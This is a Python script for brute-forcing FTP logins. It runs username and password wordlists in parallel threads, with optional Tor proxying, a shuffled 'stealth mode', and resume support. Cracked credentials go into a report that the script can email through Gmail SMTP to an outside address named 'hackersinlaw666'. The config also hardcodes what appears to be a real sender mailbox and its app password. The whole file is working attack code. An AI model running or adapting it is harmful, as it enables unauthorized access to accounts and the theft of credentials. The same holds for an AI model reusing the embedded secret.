#!/usr/bin/python3
import ftplib
import threading
import queue
import time
import sys
import os
import random
from datetime import datetime
from colorama import Fore, Style, init
import smtplib
from email.message import EmailMessage
import socks
import socket
import signal

init(autoreset=True)

# ================= CONFIG =================
FTP_HOST = "127.0.0.1"
USERLIST = "usernames.txt"
WORDLIST = "small_wordlist.txt"
THREADS = min(16, os.cpu_count()*2)
USE_TOR = False
DELAY = 0.2
LOG_FILE = "ftp_bruteforce.log"
RESUME_FILE = "last_attempt.txt"
COMMON_PORTS = [21, 2121, 990]
MAX_ATTEMPTS = 1000
STEALTH_MODE = False
REPORT_DIR = "reports"

# EMAIL CONFIG
SEND_EMAIL = False
EMAIL_SENDER = "itme28563@gmail.com"
EMAIL_PASSWORD = "qncliectcxrjbjdi "
EMAIL_RECEIVER = "hackersinlaw666@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_RETRIES = 3
# ==========================================

q = queue.Queue()
lock = threading.Lock()
stop_event = threading.Event()
total_attempts = 0
FTP_PORT = 21
active_threads = 0
success_credentials = []
failed_attempts = 0
start_time = datetime.now()

# Keep track of usernames already cracked
cracked_users = set()

# ----------------- HELPER FUNCTIONS -----------------
def log_result(username, password, success):
    status = "SUCCESS" if success else "FAIL"
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} | {username}:{password} | {status}\n")

def save_last_attempt(username, password):
    with open(RESUME_FILE, "w") as f:
        f.write(f"{username}:{password}")

def load_last_attempt():
    if os.path.exists(RESUME_FILE):
        with open(RESUME_FILE, "r") as f:
            line = f.read().strip()
            if ":" in line:
                return tuple(line.split(":",1))
    return None

def detect_ftp_port(host):
    global FTP_PORT
    for port in COMMON_PORTS:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=3)
            ftp.quit()
            FTP_PORT = port
            print(Fore.CYAN + f"[+] FTP service detected on port {port}")
            return
        except:
            continue
    print(Fore.RED + "[!] Could not detect FTP service on common ports. Using default port 21.")

def banner_grab():
    try:
        ftp = ftplib.FTP()
        ftp.connect(FTP_HOST, FTP_PORT, timeout=5)
        banner = ftp.getwelcome()
        ftp.quit()
        print(Fore.CYAN + f"[+] FTP Banner: {banner}")
    except Exception as e:
        print(Fore.YELLOW + f"[!] Could not grab banner: {e}")

def ftp_login(username, password):
    try:
        if USE_TOR:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.connect((FTP_HOST, FTP_PORT))
            ftp = ftplib.FTP()
            ftp.sock = s
        else:
            ftp = ftplib.FTP()
            ftp.connect(FTP_HOST, FTP_PORT, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        with lock:
            print(Fore.RED + f"[!] Error: {e}")
        return False

# ----------------- PROGRESS DASHBOARD -----------------
def update_progress():
    while not stop_event.is_set():
        with lock:
            print(Fore.MAGENTA + f"[*] Total Attempts: {total_attempts} | Queue Remaining: {q.qsize()} | Active Threads: {active_threads} | Success: {len(success_credentials)}", end="\r")
        time.sleep(3)
    print()

# ----------------- WORKER FUNCTION -----------------
def worker():
    global total_attempts, active_threads, failed_attempts
    active_threads += 1
    while not stop_event.is_set():
        try:
            username, password = q.get(timeout=1)
        except queue.Empty:
            break

        # Skip if username already cracked
        if username in cracked_users:
            q.task_done()
            continue

        with lock:
            if total_attempts >= MAX_ATTEMPTS:
                print(Fore.YELLOW + f"\n[*] Reached safe attempt limit ({MAX_ATTEMPTS}). Stopping threads.")
                stop_event.set()
                q.queue.clear()
                break
            total_attempts += 1
            save_last_attempt(username, password)

        success = ftp_login(username, password)
        log_result(username, password, success)

        if success:
            with lock:
                print(Fore.GREEN + f"\n[!!!] Found: {username}:{password}")
                success_credentials.append(f"{username}:{password}")
                cracked_users.add(username)  # Stop further attempts for this user

        else:
            failed_attempts += 1

        time.sleep(DELAY)
        q.task_done()
    active_threads -= 1

# ----------------- EMAIL REPORT -----------------
def send_report(report_file):
    if not SEND_EMAIL:
        return
    attempt = 0
    while attempt < EMAIL_RETRIES:
        try:
            msg = EmailMessage()
            msg['Subject'] = f"FTP Brute-Force Report: {FTP_HOST}"
            msg['From'] = EMAIL_SENDER
            msg['To'] = EMAIL_RECEIVER
            msg.set_content(
                f"Attached is the FTP brute-force report for {FTP_HOST}.\n"
                f"Total Attempts: {total_attempts}\nThreads: {THREADS}\nTime: {datetime.now()}"
            )
            with open(report_file, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain",
                                   filename=os.path.basename(report_file))
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            print(Fore.CYAN + f"[+] Report emailed successfully to {EMAIL_RECEIVER}")
            break
        except Exception as e:
            attempt += 1
            print(Fore.YELLOW + f"[!] Email failed ({attempt}/{EMAIL_RETRIES}): {e}")
            time.sleep(3)
    else:
        print(Fore.YELLOW + f"[!] Email could not be sent after {EMAIL_RETRIES} attempts.")

# ----------------- REPORT GENERATION -----------------
def generate_report():
    if not os.path.exists(REPORT_DIR):
        os.makedirs(REPORT_DIR)
    end_time = datetime.now()
    duration = end_time - start_time
    report_file = os.path.join(REPORT_DIR, f"ftp_report_{end_time.strftime('%Y%m%d_%H%M%S')}.txt")
    with open(report_file, "w") as f:
        f.write("==== FTP Brute-Force Report ====\n")
        f.write(f"Target Host: {FTP_HOST}\n")
        f.write(f"Port: {FTP_PORT}\n")
        f.write(f"Start Time: {start_time}\n")
        f.write(f"End Time: {end_time}\n")
        f.write(f"Duration: {duration}\n")
        f.write(f"Total Attempts: {total_attempts}\n")
        f.write(f"Threads Used: {THREADS}\n")
        f.write(f"Safe Attempt Limit: {MAX_ATTEMPTS}\n")
        f.write(f"Success Credentials: {', '.join(success_credentials) if success_credentials else 'None'}\n")
    print(Fore.CYAN + f"[+] Report saved: {report_file}")
    send_report(report_file)

# ----------------- MAIN -----------------
def main():
    detect_ftp_port(FTP_HOST)
    banner_grab()

    try:
        with open(USERLIST, "r", errors="ignore") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Username list not found: {USERLIST}")
        sys.exit(1)

    try:
        with open(WORDLIST, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Wordlist not found: {WORDLIST}")
        sys.exit(1)

    if STEALTH_MODE:
        random.shuffle(usernames)
        random.shuffle(passwords)

    last_attempt = load_last_attempt()
    resume = False

    for username in usernames:
        for password in passwords:
            if last_attempt and not resume:
                if (username, password) == last_attempt:
                    resume = True
                continue
            q.put((username, password))

    # Start progress dashboard
    progress_thread = threading.Thread(target=update_progress)
    progress_thread.daemon = True
    progress_thread.start()

    # Start worker threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    # Handle graceful Ctrl+C
    def signal_handler(sig, frame):
        print(Fore.YELLOW + "\n[!] User interrupted. Stopping all threads...")
        stop_event.set()
    signal.signal(signal.SIGINT, signal_handler)

    for t in threads:
        t.join()

    print(Fore.YELLOW + "\n[*] Brute-force finished.")
    if success_credentials:
        print(Fore.GREEN + f"[+] Valid credentials found: {', '.join(success_credentials)}")
    else:
        print(Fore.RED + "[-] No valid credentials found.")

    if os.path.exists(RESUME_FILE):
        os.remove(RESUME_FILE)

    generate_report()

if __name__ == "__main__":
    print(Fore.YELLOW + f"[+] Starting FTP brute force on {FTP_HOST} with {THREADS} threads (Safe limit: {MAX_ATTEMPTS} attempts)")
    main()
